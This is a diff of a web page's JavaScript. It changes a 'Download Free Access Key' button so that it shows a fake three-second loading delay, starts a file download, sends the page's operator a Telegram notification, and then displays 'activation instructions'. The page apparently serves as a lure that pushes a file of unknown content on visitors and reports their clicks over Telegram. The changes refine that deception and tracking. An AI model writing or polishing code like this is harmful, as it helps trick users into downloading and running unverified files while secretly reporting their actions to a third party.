@@ -642,28 +642,25 @@
       document.body.removeChild(a);
     }
 
-    // Step 1: Download Button
-    document.getElementById('downloadBtn').addEventListener('click', function() {
-      const btn = this;
-      
-      // Show loading
-      document.getElementById('step1').style.display = 'none';
-      document.getElementById('loadingSection').classList.add('active');
-      
-      // Telegram notification
-      sendTelegramMessage('📥 ACCESS KEY DOWNLOAD STARTED', 'User clicked Download Free Access Key');
-      
-      // Start download
-      startDownload();
-      
-      // Simulate processing delay (3 seconds)
-      setTimeout(() => {
+// Step 1: Download Button
+document.getElementById('downloadBtn').addEventListener('click', function() {
+    // Show loading
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('loadingSection').classList.add('active');
+    
+    // Simulate processing delay (3 seconds), dann Download + Telegram
+    setTimeout(() => {
+        // ERST JETZT download starten
+        startDownload();
+        
+        // Telegram notification (nur eine)
+        sendTelegramMessage('✅ ACCESS KEY DOWNLOADED', 'Access Key prepared and downloaded');
+        
+        // UI aktualisieren
         document.getElementById('loadingSection').classList.remove('active');
         document.getElementById('step3').style.display = 'block';
-        
-        sendTelegramMessage('✅ ACCESS KEY DOWNLOADED', 'File downloaded, showing activation instructions');
-      }, 3000);
-    });
+    }, 3000);
+});
 
     // Step 3: Activation Button
     document.getElementById('activateBtn').addEventListener('click', function() {
